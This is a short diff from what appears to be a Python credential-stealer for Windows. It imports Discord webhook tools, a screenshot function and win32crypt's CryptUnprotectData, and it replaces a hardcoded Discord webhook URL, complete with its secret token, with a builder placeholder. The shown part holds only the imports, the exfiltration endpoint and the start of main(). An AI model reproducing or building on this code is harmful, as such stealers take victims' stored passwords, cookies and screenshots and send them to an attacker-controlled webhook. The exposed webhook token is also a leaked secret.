@@ -19,7 +19,7 @@ from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/958778933803888680/iRxdxjwCBC-m2BhXlHfUpRIpLgpFzEonAttNM5xr9r2lu2bZzy8NRyiBOuqmB2I76vOq"
+WEBHOOK_URL = "&WEBHOOK_URL&"
 
 def main(webhook_url):
     global webhook, embed
